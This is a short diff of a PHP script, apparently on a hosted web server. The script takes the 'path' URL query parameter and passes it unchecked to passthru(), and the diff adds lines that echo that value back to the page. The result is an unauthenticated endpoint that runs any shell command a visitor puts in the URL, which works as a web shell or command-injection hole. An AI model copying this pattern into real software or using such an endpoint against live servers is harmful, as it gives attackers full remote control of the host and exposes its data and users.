@@ -2,6 +2,8 @@
 echo __FILE__;
 echo "<br>";
 $expath = $_GET["path"];
+echo $expath;
+echo "<br>";
 passthru($expath);
 //chdir("./cygwin/rootfs/bin/");
  //    $psScriptPath = "C:\home\site\wwwroot\get-process.ps1";
